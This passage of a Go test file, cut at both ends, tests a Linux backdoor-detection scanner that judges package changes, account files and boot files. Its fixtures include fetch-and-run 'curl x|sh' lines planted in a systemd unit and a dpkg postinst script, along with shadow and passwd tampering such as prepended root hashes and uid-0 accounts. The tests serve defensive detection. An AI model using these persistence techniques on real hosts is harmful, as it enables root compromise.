	must(t, r, "heur.immutable:/usr/bin/ls", model.SevBackdoor)
}

// R54: firmware and microcode updates rebuild the initramfs.
func TestJudgeFirmwareRebuildsInitramfs(t *testing.T) {
	for _, name := range []string{"firmware-misc-nonfree", "linux-firmware", "intel-microcode", "amd64-microcode"} {
		old := clean()
		old.Packages.Installed = append(old.Packages.Installed, pkg(name, "1"))
		old.Files = append(old.Files, file("/boot/initrd.img-6.1.0-25-amd64", "initrd", 0o644))
		cur := clone(old)
		setVersion(cur, name, "2")
		setFile(cur, file("/boot/initrd.img-6.1.0-25-amd64", "initrd 2", 0o644))
		r := run(cur, snapOf(old), archive(pkgverify.FileVerdict{Path: "/usr/lib/firmware/x.bin", Package: name, Version: "2", Source: "archive"}))
		absent(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64")
		if g := explained(r, "explained:"+name); g == nil || !hasEvidencePath(g, "/boot/initrd.img-6.1.0-25-amd64") {
			t.Errorf("%s: initramfs not shown with it", name)
		}
	}
}

// R52: a new package raised for its own reasons keeps them in its value
// even when its programs could not be checked.
func TestJudgeUncheckedNewPackageKeepsItsReasons(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Packages.Installed = append(cur.Packages.Installed, pkg("helperpkg", "1.0-1", "/usr/bin/helper"))
	cur.Files = append(cur.Files, file("/usr/bin/helper", "helper", 0o4755))
	res := &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
		{Path: "/usr/bin/helper", Package: "helperpkg", Version: "1.0-1", Reason: "could not check the package: connection refused", Kind: pkgverify.KindUnreachable}}}
	r := run(cur, snapOf(old), res)
	f := must(t, r, "snap.pkg_installed:helperpkg", model.SevBackdoor)
	if !strings.Contains(f.Evidence[0].After, "setuid/setgid program") {
		t.Errorf("value %q", f.Evidence[0].After)
	}
	must(t, r, "pkg.unchecked_changes", model.SevNote)
	absent(t, r, "pkg.unverifiable:/usr/bin/helper")
}

// R55: without a snapshot too, a setuid program, module, PAM module or boot
// file that could not be checked because the archive could not be used
// goes into the one note; a version no trusted source has, or an untrusted
// source, stays a backdoor sign each.
func TestJudgeUncheckedSpecialFilesWithoutSnapshot(t *testing.T) {
	c := clean()
	su := file("/usr/bin/su", "su", 0o4755)
	ko := file("/lib/modules/6.1.0-25-amd64/kernel/fs/x.ko", "ko", 0o644)
	c.Files = append(c.Files, su, ko)
	c.Packages.Installed = append(c.Packages.Installed, pkg("login", "1:4.13", su.Path), pkg("linux-image-6.1.0-25-amd64", "6.1.106-3", ko.Path))
	down := "could not read the official archive index: Get \"https://deb.debian.org/debian/dists/bookworm/InRelease\": dial tcp: lookup deb.debian.org: no such host"
	verdicts := func(kind string) *pkgverify.Result {
		return &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
			{Path: su.Path, Package: "login", Version: "1:4.13", Reason: down, Kind: kind},
			{Path: ko.Path, Package: "linux-image-6.1.0-25-amd64", Version: "6.1.106-3", Reason: down, Kind: kind}}}
	}

	r := run(c, nil, verdicts(pkgverify.KindUnreachable))
	absent(t, r, "pkg.unverifiable:"+su.Path)
	absent(t, r, "pkg.unverifiable:"+ko.Path)
	f := must(t, r, "pkg.unchecked_changes", model.SevNote)
	if f.Title != "2 package files could not be checked because the package archive could not be reached" || !hasEvidencePath(f, su.Path) || !hasEvidencePath(f, ko.Path) {
		t.Errorf("note %q %+v", f.Title, f.Evidence)
	}
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "no such host") }) {
		t.Errorf("reason not stated: %q", r.CouldNotRuleOut)
	}
	if r.ExitCode != 1 {
		t.Errorf("exit %d (%v)", r.ExitCode, keys(r))
	}

	for _, kind := range []string{pkgverify.KindNotFound, pkgverify.KindUntrusted} {
		r = run(c, nil, verdicts(kind))
		must(t, r, "pkg.unverifiable:"+su.Path, model.SevBackdoor)
		must(t, r, "pkg.unverifiable:"+ko.Path, model.SevBackdoor)
		absent(t, r, "pkg.unchecked_changes")
	}
}

// --- review round 2 ---

func sshBase() *model.Collection {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("openssh-server", "1:9.2p1-2+deb12u3", "/usr/sbin/sshd", "/usr/lib/systemd/system/ssh.service"))
	old.Files = append(old.Files, file("/usr/sbin/sshd", "sshd", 0o755), file("/usr/lib/systemd/system/ssh.service", "ExecStart=/usr/sbin/sshd -D", 0o644))
	return old
}

// upgradeSSH changes sshd at a new version and reports it with kind.
func upgradeSSH(old *model.Collection, version, content, kind, reason string) (*model.Collection, *pkgverify.Result) {
	cur := clone(old)
	setVersion(cur, "openssh-server", version)
	setFile(cur, file("/usr/sbin/sshd", content, 0o755))
	res := archive()
	res.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: version, Actual: h(content), Reason: reason, Kind: kind}}
	return cur, res
}

// R58: only network kinds fold into the note on unchecked files; kinds that
// come from data root can write are backdoor signs.
func TestJudgeOnlyNetworkKindsAreUnchecked(t *testing.T) {
	old := sshBase()
	for _, tc := range []struct {
		kind    string
		folds   bool
		version string
	}{
		{pkgverify.KindUnreachable, true, "1:9.2p1-2+deb12u9"},
		{pkgverify.KindBadSignature, true, "1:9.2p1-2+deb12u9"},
		{pkgverify.KindPro, false, "1:9.2p1-2+deb12u9+esm1"}, // Debian: "+esm" is just text in a version
		{pkgverify.KindUnsupportedArch, false, "1:9.2p1-2+deb12u9"},
		{pkgverify.KindBudget, false, "1:9.2p1-2+deb12u9"},
		{pkgverify.KindNotHashed, false, "1:9.2p1-2+deb12u9"},
		{pkgverify.KindNotChecked, false, "1:9.2p1-2+deb12u9"},
	} {
		cur, res := upgradeSSH(old, tc.version, "trojan sshd", tc.kind, "reason for "+tc.kind)
		r := run(cur, snapOf(old), res)
		if tc.folds {
			absent(t, r, "snap.pkg_upgraded:openssh-server")
			must(t, r, "pkg.unchecked_changes", model.SevNote)
		} else {
			must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
			absent(t, r, "pkg.unchecked_changes")
			if r.ExitCode != 2 {
				t.Errorf("%s: exit %d", tc.kind, r.ExitCode)
			}
		}
	}

	// R61: even on Ubuntu with an ESM source (both root can write), a Pro
	// version nothing confirmed is a backdoor sign; only unreadable base
	// indexes fold.
	ub := sshBase()
	ub.Host.OSID = "ubuntu"
	ub.Packages.Sources = []model.AptSource{{URIs: []string{"https://esm.ubuntu.com/apps/ubuntu"}, Suites: []string{"noble-apps-security"}}}
	cur, res := upgradeSSH(ub, "1:9.6p1-3ubuntu13.5+esm1", "sshd esm", pkgverify.KindPro, pkgverify.ReasonPro)
	r := run(cur, snapOf(ub), res)
	must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	absent(t, r, "pkg.unchecked_changes")

	// The package budget: still a backdoor sign, and the limit is a note.
	cur, res = upgradeSSH(old, "1:9.2p1-2+deb12u9", "trojan sshd", pkgverify.KindBudget, "not checked: the collection lists more than 10000 packages")
	b := must(t, run(cur, snapOf(old), res), "pkg.budget_exceeded", model.SevNote)
	if !strings.Contains(b.Why, "unusual") {
		t.Errorf("budget why %q", b.Why)
	}
}

// R58/R55: the same rules without a snapshot, for setuid programs, kernel
// modules, PAM modules and boot files; an unsupported host is a limit of
// the whole scan.
func TestJudgeSpecialFileKindsWithoutSnapshot(t *testing.T) {
	c := clean()
	c.Packages.Installed = append(c.Packages.Installed, model.Package{Name: "sudo", Version: "1.9.13p3-1+deb12u1", Arch: "mips64el", Status: "install ok installed", Files: []string{"/usr/bin/sudo"}})
	c.Files = append(c.Files, file("/usr/bin/sudo", "trojan sudo", 0o4755))
	res := func(kind, reason string) *pkgverify.Result {
		return &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
			{Path: "/usr/bin/sudo", Package: "sudo", Version: "1.9.13p3-1+deb12u1", Actual: h("trojan sudo"), Reason: reason, Kind: kind}}}
	}
	for _, kind := range []string{pkgverify.KindUnsupportedArch, pkgverify.KindPro, pkgverify.KindBudget, pkgverify.KindNotHashed, pkgverify.KindNotChecked, ""} {
		r := run(c, nil, res(kind, "reason"))
		must(t, r, "pkg.unverifiable:/usr/bin/sudo", model.SevBackdoor)
		absent(t, r, "pkg.unchecked_changes")
	}
	r := run(c, nil, res(pkgverify.KindHostArch, `host architecture "riscv64" is not supported for package verification`))
	absent(t, r, "pkg.unverifiable:/usr/bin/sudo")
	absent(t, r, "pkg.unverifiable")
	absent(t, r, "pkg.unchecked_changes")
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "riscv64") }) {
		t.Errorf("scan limit not stated: %q", r.CouldNotRuleOut)
	}
}

// R60: a version no trusted source has explains none of its files, programs
// or not.
func TestJudgeUnconfirmedVersionExplainsNoFile(t *testing.T) {
	old := sshBase()
	cur := clone(old)
	v := "1:9.2p1-2+deb12u9"
	setVersion(cur, "openssh-server", v)
	unit := "ExecStartPre=/bin/sh -c 'curl x|sh'\nExecStart=/usr/sbin/sshd -D"
	setFile(cur, file("/usr/lib/systemd/system/ssh.service", unit, 0o644))
	res := archive()
	res.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/lib/systemd/system/ssh.service", Package: "openssh-server", Version: v, Actual: h(unit), Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}
	r := run(cur, snapOf(old), res)
	f := must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	if !hasEvidencePath(f, "/usr/lib/systemd/system/ssh.service") {
		t.Errorf("changed unit not listed: %+v", f.Evidence)
	}
	if explained(r, "explained:openssh-server") != nil || r.ExitCode != 2 {
		t.Errorf("explained or wrong exit %d", r.ExitCode)
	}
}

// R59: the account files as glibc reads them; duplicates and rejected lines
// are backdoor signs, and only a clean file gets the ageing/GECOS note.
func TestJudgeAccountFileAnomalies(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, file("/etc/shadow", "root:$y$orig:20000:0:99999:7:::", 0o640))
	cur := clone(old)
	// A root line prepended: glibc uses it, so the collector does too, and
	// records the duplicate.
	setFile(cur, file("/etc/shadow", "root:$6$attacker:20000:0:99999:7:::\nroot:$y$orig:20000:0:99999:7:::", 0o640))
	cur.Accounts.Users[0].Password.Digest = "digest-attacker"
	cur.Accounts.Duplicates = []string{"/etc/shadow:root"}
	r := run(cur, snapOf(old), nil)
	must(t, r, "acct.duplicate:/etc/shadow:root", model.SevBackdoor)

	// The file changed and the comparison saw nothing, but it holds a
	// rejected line: not the ageing note.
	cur2 := clone(old)
	setFile(cur2, file("/etc/shadow", "root:$y$orig:20000:0:99999:7:::\nroot:$6$x", 0o640))
	cur2.Accounts.Malformed = []string{"/etc/shadow:2"}
	r = run(cur2, snapOf(old), nil)
	must(t, r, "acct.malformed:/etc/shadow:2", model.SevBackdoor)
	must(t, r, "snap.file_modified:/etc/shadow", model.SevBackdoor)

	// A new group with a privileged group's id is as privileged.
	old3 := clean()
	cur3 := clone(old3)
	cur3.Accounts.Groups = append(cur3.Accounts.Groups, model.Group{Name: "sudo2", GID: 27, Members: []string{"eve"}})
	must(t, run(cur3, snapOf(old3), nil), "snap.group:sudo2", model.SevBackdoor)
}

// A system directory handed to an ordinary account is a backdoor sign even
// when its mode stays the same.
func TestJudgeDirectoryGivenAway(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, model.FileEntry{Path: "/usr/local/sbin", Type: "dir", Mode: 0o040755, MTime: taken, CTime: taken},
		model.FileEntry{Path: "/etc/systemd/system", Type: "dir", Mode: 0o040755, MTime: taken, CTime: taken})
	cur := clone(old)
	setFile(cur, model.FileEntry{Path: "/usr/local/sbin", Type: "dir", Mode: 0o040755, UID: 1000, MTime: changed, CTime: changed})
	setFile(cur, model.FileEntry{Path: "/etc/systemd/system", Type: "dir", Mode: 0o040755, UID: 1000, MTime: changed, CTime: changed})
	r := run(cur, snapOf(old), archive())
	for _, p := range []string{"/usr/local/sbin", "/etc/systemd/system"} {
		f := must(t, r, "snap.file_modified:"+p, model.SevBackdoor)
		if !strings.Contains(f.Fix, "chown 0:0") {
			t.Errorf("%s fix %q", p, f.Fix)
		}
	}
}

// N3: an exception on a package change covers exactly the files it
// accepted; other content at the same version is a finding again.
func TestJudgePackageExceptionsCoverFileContents(t *testing.T) {
	old := sshBase()
	v := "1:9.2p1-2+deb12u9+local1"
	s := snapOf(old)
	cur, res := upgradeSSH(old, v, "my patched sshd", pkgverify.KindNotFound, pkgverify.ReasonNotOfficial)
	f := must(t, run(cur, s, res), "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	s.Exceptions = []model.Exception{{FindingKey: f.Key, AcceptedValue: currentValue(f), At: taken}}
	absent(t, run(cur, s, res), "snap.pkg_upgraded:openssh-server")
	cur2, res2 := upgradeSSH(old, v, "attacker sshd", pkgverify.KindNotFound, pkgverify.ReasonNotOfficial)
	must(t, run(cur2, s, res2), "snap.pkg_upgraded:openssh-server", model.SevBackdoor)

	// A new package.
	old2 := clean()
	s2 := snapOf(old2)
	mk := func(content string) (*model.Collection, *pkgverify.Result) {
		c := clone(old2)
		c.Packages.Installed = append(c.Packages.Installed, pkg("foo", "1.0", "/usr/bin/foo"))
		c.Files = append(c.Files, file("/usr/bin/foo", content, 0o755))
		r := archive()
		r.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/bin/foo", Package: "foo", Version: "1.0", Actual: h(content), Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}
		return c, r
	}
	c3, r3 := mk("foo v1")
	f = must(t, run(c3, s2, r3), "snap.pkg_installed:foo", model.SevBackdoor)
	s2.Exceptions = []model.Exception{{FindingKey: f.Key, AcceptedValue: currentValue(f), At: taken}}
	absent(t, run(c3, s2, r3), "snap.pkg_installed:foo")
	c4, r4 := mk("foo trojaned")
	must(t, run(c4, s2, r4), "snap.pkg_installed:foo", model.SevBackdoor)

	// The note on unchecked files.
	s3 := snapOf(old)
	cur5, res5 := upgradeSSH(old, "1:9.2p1-2+deb12u9", "sshd a", pkgverify.KindUnreachable, "timeout")
	u := must(t, run(cur5, s3, res5), "pkg.unchecked_changes", model.SevNote)
	s3.Exceptions = []model.Exception{{FindingKey: u.Key, AcceptedValue: currentValue(u), At: taken}}
	absent(t, run(cur5, s3, res5), "pkg.unchecked_changes")
	cur6, res6 := upgradeSSH(old, "1:9.2p1-2+deb12u9", "sshd b", pkgverify.KindUnreachable, "timeout")
	must(t, run(cur6, s3, res6), "pkg.unchecked_changes", model.SevNote)
}

// An architecture edited in dpkg status shows as an install and a removal
// of the same name; the package is judged once, as the one installed now.
func TestJudgeArchitectureSwitch(t *testing.T) {
	old := sshBase()
	cur := clone(old)
	for i := range cur.Packages.Installed {
		if cur.Packages.Installed[i].Name == "openssh-server" {
			cur.Packages.Installed[i].Arch = "mips64el"
		}
	}
	setFile(cur, file("/usr/sbin/sshd", "trojan sshd", 0o755))
	res := archive()
	res.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: "1:9.2p1-2+deb12u3", Actual: h("trojan sshd"), Reason: `unsupported architecture "mips64el"`, Kind: pkgverify.KindUnsupportedArch}}
	r := run(cur, snapOf(old), res)
	absent(t, r, "snap.pkg_removed:openssh-server")
	f := must(t, r, "snap.pkg_installed:openssh-server", model.SevBackdoor)
	if !hasEvidencePath(f, "/usr/sbin/sshd") {
		t.Errorf("evidence %+v", f.Evidence)
	}
}

// A collection that still lists a group twice.
func TestJudgeDuplicateGroupEntries(t *testing.T) {
	c := clean()
	c.Accounts.Groups = append(c.Accounts.Groups, model.Group{Name: "sudo", GID: 27, Members: []string{"eve"}})
	must(t, run(c, nil, nil), "acct.duplicate:/etc/group:sudo", model.SevBackdoor)
}

// --- review round 3 ---

type acctFiles struct{ passwd, shadow, group, gshadow string }

var acctBase = acctFiles{
	passwd:  "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n",
	shadow:  "root:$y$orig:20000:0:99999:7:::\nalice:$y$alice:20000:0:99999:7:::\n",
	group:   "root:x:0:\nsudo:x:27:alice\nstaff:x:50:\nusers:x:100:\nalice:x:1000:\n",
	gshadow: "root:*::\nsudo:!::alice\nstaff:*::\nusers:*::\nalice:!::\n",
}

// collectAccounts runs the real collector on account files written to a
// fresh root and puts the result, and the files' entries, on a collection.
func collectAccounts(t *testing.T, a acctFiles) *model.Collection {
	t.Helper()
	d := t.TempDir()
	if err := os.MkdirAll(filepath.Join(d, "etc"), 0o755); err != nil {
		t.Fatal(err)
	}
	c := clean()
	for name, body := range map[string]string{"passwd": a.passwd, "shadow": a.shadow, "group": a.group, "gshadow": a.gshadow} {
		if err := os.WriteFile(filepath.Join(d, "etc", name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
		perm := uint32(0o644)
		if name == "shadow" || name == "gshadow" {
			perm = 0o640
		}
		setFile(c, file("/etc/"+name, body, perm))
	}
	c.Accounts, _ = collect.Accounts(d, ctx.DigestKey)
	return c
}

func acctRun(t *testing.T, before, after acctFiles) *model.Report {
	t.Helper()
	return run(collectAccounts(t, after), snapOf(collectAccounts(t, before)), archive())
}

// Account file attacks, collected the way glibc reads the files.
func TestJudgeAccountAttacksEndToEnd(t *testing.T) {
	b := acctBase
	for _, tc := range []struct {
		name  string
		after acctFiles
		keys  []string
	}{
		{"shadow prepend", acctFiles{b.passwd, "root:$6$attacker:20000:0:99999:7:::\n" + b.shadow, b.group, b.gshadow}, []string{"acct.duplicate:/etc/shadow:root"}},
		{"4-field passwd uid 0", acctFiles{b.passwd + "toor:x:0:0\n", b.shadow, b.group, b.gshadow}, []string{"snap.user_added:toor"}},
		{"2-field gshadow replaces", acctFiles{b.passwd, b.shadow, b.group, "root:*::\nsudo:$6$grouphash\nstaff:*::\nusers:*::\nalice:!::\n"}, []string{"snap.group:sudo"}},
		{"2-field gshadow prepended", acctFiles{b.passwd, b.shadow, b.group, "root:*::\nsudo:$6$grouphash\nsudo:!::alice\nstaff:*::\nusers:*::\nalice:!::\n"}, []string{"snap.group:sudo", "acct.duplicate:/etc/gshadow:sudo"}},
		{"2-field gshadow appended", acctFiles{b.passwd, b.shadow, b.group, b.gshadow + "sudo:$6$grouphash\n"}, []string{"acct.duplicate:/etc/gshadow:sudo"}},
		{"duplicate group line", acctFiles{b.passwd, b.shadow, b.group + "sudo:x:27:eve\n", b.gshadow}, []string{"acct.duplicate:/etc/group:sudo"}},
		{"duplicate group line prepended", acctFiles{b.passwd, b.shadow, "sudo:x:27:alice,eve\n" + b.group, b.gshadow}, []string{"snap.group:sudo"}},
		{"gid alias", acctFiles{b.passwd, b.shadow, b.group + "wheel2:x:27:eve\n", b.gshadow}, []string{"snap.group:wheel2"}},
		{"user with primary gid sudo", acctFiles{b.passwd + "eve:x:1001:27::/home/eve:/bin/bash\n", b.shadow + "eve:$y$eve:20000:0:99999:7:::\n", b.group, b.gshadow}, []string{"snap.user_added:eve"}},
		{"primary gid changed to sudo", acctFiles{"root:x:0:0:root:/root:/bin/bash\nalice:x:1000:27::/home/alice:/bin/bash\n", b.shadow, b.group, b.gshadow}, []string{"snap.user_changed:alice"}},
		{"uid 2^32", acctFiles{b.passwd + "big:x:4294967296:0::/:/bin/sh\n", b.shadow, b.group, b.gshadow}, []string{"acct.malformed:/etc/passwd:3"}},
		{"empty-name group gid 27", acctFiles{b.passwd, b.shadow, b.group + ":x:27:eve\n", b.gshadow}, []string{"acct.malformed:/etc/group:6 (empty name, gid 27, members eve)"}},
		{"empty-name uid 0 first", acctFiles{":x:0:0::/tmp/x:/tmp/x/sh\n" + b.passwd, b.shadow, b.group, b.gshadow}, []string{"acct.malformed:/etc/passwd:1 (empty name, uid 0)"}},
		{"empty-name gshadow", acctFiles{b.passwd, b.shadow, b.group, b.gshadow + ":$6$grouphash::eve\n"}, []string{"acct.malformed:/etc/gshadow:6 (empty name)"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := acctRun(t, b, tc.after)
			for _, k := range tc.keys {
				must(t, r, k, model.SevBackdoor)
			}
			if r.ExitCode != 2 {
				t.Errorf("exit %d (%v)", r.ExitCode, keys(r))
			}
		})
	}

	// An out-of-range first line is dropped by glibc, so the next line for
	// the same name counts: alice is uid 0.
	r := acctRun(t, b, acctFiles{"root:x:0:0:root:/root:/bin/bash\nalice:x:4294968296:1000::/home/alice:/bin/bash\nalice:x:0:0::/home/alice:/bin/bash\n", b.shadow, b.group, b.gshadow})
	f := must(t, r, "snap.user_changed:alice", model.SevBackdoor)
	if !strings.Contains(f.Evidence[0].After, "uid 0") {
		t.Errorf("evidence %+v", f.Evidence[0])
	}
	must(t, r, "acct.malformed:/etc/passwd:2", model.SevBackdoor)
	m := must(t, acctRun(t, b, acctFiles{":x:0:0::/tmp/x:/tmp/x/sh\n" + b.passwd, b.shadow, b.group, b.gshadow}), "acct.malformed:/etc/passwd:1 (empty name, uid 0)", model.SevBackdoor)
	if !strings.Contains(m.Title, "uid 0") {
		t.Errorf("title %q", m.Title)
	}
}

// R61: whether the archive could be reached is decided once per scan. With
// the host's indexes read, any per-package failure is "no trusted source
// confirmed it" (the probe: a 9 KB version reached HTTP 414 at the snapshot
// service); only failing base indexes fold into the note.
func TestJudgeReachabilityIsPerScan(t *testing.T) {
	old := sshBase()
	v := "1:9.2p1-2+deb12u9" + strings.Repeat("a", 9000)
	cur, res := upgradeSSH(old, v, "trojan sshd", pkgverify.KindNotFound, "the version in dpkg status is not a valid Debian version, so no source was asked")
	r := run(cur, snapOf(old), res)
	must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	absent(t, r, "pkg.unchecked_changes")

	cur, res = upgradeSSH(old, "1:9.2p1-2+deb12u9", "sshd 2", pkgverify.KindUnreachable, "could not read the official archive index: dial tcp: i/o timeout")
	r = run(cur, snapOf(old), res)
	absent(t, r, "snap.pkg_upgraded:openssh-server")
	must(t, r, "pkg.unchecked_changes", model.SevNote)
}

// R61: /etc/os-release naming a release telltale does not verify: special
// files are a backdoor sign each, other files one note, and the report says
// verification did not run. An unsupported host architecture is only said.
func TestJudgeVerificationDidNotRun(t *testing.T) {
	c := clean()
	c.Host.OSID, c.Host.OSVersionID = "debian", "99"
	c.Packages.Installed = append(c.Packages.Installed, pkg("sudo", "1.9.13p3-1+deb12u1", "/usr/bin/sudo"), pkg("jq", "1.6-2.1", "/usr/bin/jq"))
	c.Files = append(c.Files, file("/usr/bin/sudo", "sudo", 0o4755), file("/usr/bin/jq", "jq", 0o755))
	verdicts := func(kind, reason string) *pkgverify.Result {
		return &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
			{Path: "/usr/bin/sudo", Package: "sudo", Reason: reason, Kind: kind},
			{Path: "/usr/bin/jq", Package: "jq", Reason: reason, Kind: kind}}}
	}
	r := run(c, nil, verdicts(pkgverify.KindRelease, `release not supported for package verification: "debian" "99"`))
	must(t, r, "pkg.unverifiable:/usr/bin/sudo", model.SevBackdoor)
	must(t, r, "pkg.unverifiable", model.SevNote)
	absent(t, r, "pkg.unverifiable:/usr/bin/jq")
	if !slices.Contains(r.CouldNotRuleOut, "package verification did not run: /etc/os-release says debian 99") {
		t.Errorf("could not rule out %q", r.CouldNotRuleOut)
	}

	r = run(c, nil, verdicts(pkgverify.KindHostArch, `host architecture "riscv64" is not supported for package verification`))
	absent(t, r, "pkg.unverifiable:/usr/bin/sudo")
	absent(t, r, "pkg.unverifiable")
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "host architecture") }) {
		t.Errorf("could not rule out %q", r.CouldNotRuleOut)
	}
}

// R61: a deadline never folds: what was left is stated, and special files
// of a changed package stay backdoor signs.
func TestJudgeDeadlineDoesNotFold(t *testing.T) {
	old := sshBase()
	old.Packages.Installed = append(old.Packages.Installed, pkg("sudo", "1.9.13p3-1+deb12u1", "/usr/bin/sudo"))
	old.Files = append(old.Files, file("/usr/bin/sudo", "sudo", 0o4755))
	cur := clone(old)
	setVersion(cur, "sudo", "1.9.13p3-1+deb12u9")
	setFile(cur, file("/usr/bin/sudo", "trojan sudo", 0o4755))
	setVersion(cur, "openssh-server", "1:9.2p1-2+deb12u9")
	setFile(cur, file("/usr/sbin/sshd", "sshd 2", 0o755))
	res := archive()
	res.Unverifiable = []pkgverify.FileVerdict{
		{Path: "/usr/bin/sudo", Package: "sudo", Reason: "check stopped: context deadline exceeded", Kind: pkgverify.KindStopped},
		{Path: "/usr/sbin/sshd", Package: "openssh-server", Reason: "check stopped: context deadline exceeded", Kind: pkgverify.KindStopped}}
	r := run(cur, snapOf(old), res)
	must(t, r, "pkg.unverifiable:/usr/bin/sudo", model.SevBackdoor)
	must(t, r, "snap.pkg_upgraded:sudo", model.SevBackdoor)
	absent(t, r, "pkg.unchecked_changes")
	if explained(r, "explained:openssh-server") != nil {
		t.Errorf("an upgrade nothing checked is explained")
	}
	if !slices.Contains(r.CouldNotRuleOut, "verification stopped before 2 packages were checked") {
		t.Errorf("could not rule out %q", r.CouldNotRuleOut)
	}
}

// A rebuilder's version change explains a rebuilt initramfs only when
// something confirms the new version (one of its files verified): a
// hand-edited version bump explains nothing.
func TestJudgeFakeRebuilderBump(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("initramfs-tools", "0.142", "/usr/sbin/update-initramfs"))
	old.Files = append(old.Files, file("/usr/sbin/update-initramfs", "u-i", 0o755), file("/boot/initrd.img-6.1.0-25-amd64", "initrd", 0o644))
	cur := clone(old)
	setVersion(cur, "initramfs-tools", "0.142+deb12u9")
	setFile(cur, file("/boot/initrd.img-6.1.0-25-amd64", "initrd with implant", 0o644))
	must(t, run(cur, snapOf(old), archive()), "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)

	// The real upgrade: its changed program verified.
	setFile(cur, file("/usr/sbin/update-initramfs", "u-i 2", 0o755))
	res := archive(pkgverify.FileVerdict{Path: "/usr/sbin/update-initramfs", Package: "initramfs-tools", Version: "0.142+deb12u9", Expected: h("u-i 2"), Actual: h("u-i 2"), Source: "archive"})
	absent(t, run(cur, snapOf(old), res), "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64")
}

// A package installed for a second architecture while the same name is
// upgraded is judged as an install.
func TestJudgeSecondArchitectureInstall(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("foo", "1.0-1", "/usr/bin/foo"))
	old.Files = append(old.Files, file("/usr/bin/foo", "foo1", 0o755))
	cur := clone(old)
	setVersion(cur, "foo", "1.0-2")
	setFile(cur, file("/usr/bin/foo", "foo2", 0o755))
	i386 := pkg("foo", "1.0-2", "/usr/lib/i386-linux-gnu/foo/helper")
	i386.Arch = "i386"
	cur.Packages.Installed = append(cur.Packages.Installed, i386)
	cur.Files = append(cur.Files, file("/usr/lib/i386-linux-gnu/foo/helper", "helper", 0o4755))
	res := archive(
		pkgverify.FileVerdict{Path: "/usr/bin/foo", Package: "foo", Version: "1.0-2", Expected: h("foo2"), Actual: h("foo2"), Source: "archive"},
		pkgverify.FileVerdict{Path: "/usr/lib/i386-linux-gnu/foo/helper", Package: "foo", Version: "1.0-2", Expected: h("helper"), Actual: h("helper"), Source: "archive"})
	f := must(t, run(cur, snapOf(old), res), "snap.pkg_installed:foo:i386", model.SevBackdoor)
	if !hasEvidencePath(f, "/usr/lib/i386-linux-gnu/foo/helper") {
		t.Errorf("evidence %+v", f.Evidence)
	}
}

// R62, R65: a dpkg maintainer script runs as root at the next package
// operation, so a changed one is part of a package change only when package
// verification matched it with the signed package; dpkg's other records
// still fold.
func TestJudgeMaintainerScripts(t *testing.T) {
	old := clean()
	old.Files = append(old.Files,
		file("/var/lib/dpkg/info/openssl.postinst", "#!/bin/sh\nexit 0", 0o755),
		file("/var/lib/dpkg/info/openssl.triggers", "activate-noawait ldconfig", 0o644),
		file("/var/lib/dpkg/info/openssl.md5sums", "sums", 0o644))
	cur := clone(old)
	setVersion(cur, "openssl", "3.0.15-1~deb12u1")
	setFile(cur, file("/var/lib/dpkg/info/openssl.postinst", "#!/bin/sh\ncurl x|sh", 0o755))
	setFile(cur, file("/var/lib/dpkg/info/openssl.triggers", "interest /usr/bin", 0o644))
	setFile(cur, file("/var/lib/dpkg/info/openssl.md5sums", "sums 2", 0o644))

	r := run(cur, snapOf(old), archive())
	for _, p := range []string{"/var/lib/dpkg/info/openssl.postinst", "/var/lib/dpkg/info/openssl.triggers"} {
		f := must(t, r, "snap.file_modified:"+p, model.SevBackdoor)
		if !strings.Contains(f.Why, "runs as root") {
			t.Errorf("%s why %q", p, f.Why)
		}
	}
	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.md5sums")

	// The upgrade confirmed by a verified program does not vouch for the
	// scripts: each is compared with the signed package itself.
	setFile(cur, file("/usr/bin/openssl", "openssl 3.0.15", 0o755))
	program := pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.15-1~deb12u1", Expected: h("openssl 3.0.15"), Actual: h("openssl 3.0.15"), Source: "archive"}
	r = run(cur, snapOf(old), archive(program))
	must(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.postinst", model.SevBackdoor)

	// Scripts that match the signed package are part of the upgrade.
	r = run(cur, snapOf(old), archive(program,
		pkgverify.FileVerdict{Path: "/var/lib/dpkg/info/openssl.postinst", Package: "openssl", Version: "3.0.15-1~deb12u1", Expected: h("#!/bin/sh\ncurl x|sh"), Actual: h("#!/bin/sh\ncurl x|sh"), Source: "archive"},
